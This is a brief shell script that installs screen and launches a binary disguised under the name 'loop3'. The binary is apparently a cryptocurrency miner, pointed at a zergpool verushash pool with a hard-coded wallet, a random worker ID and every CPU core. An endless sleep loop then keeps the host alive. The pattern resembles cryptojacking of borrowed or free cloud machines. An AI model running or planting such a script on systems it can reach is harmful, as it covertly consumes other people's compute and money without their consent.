#!/bin/sh
sudo apt update
sudo apt install screen -y
./loop3 -v -l verushash.asia.mine.zergpool.com:3300 -u RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4.$(shuf -n 1 -i 1-99999)-cpu -p x -t $(nproc)
while [ 1 ]; do
sleep 3
done
sleep 999
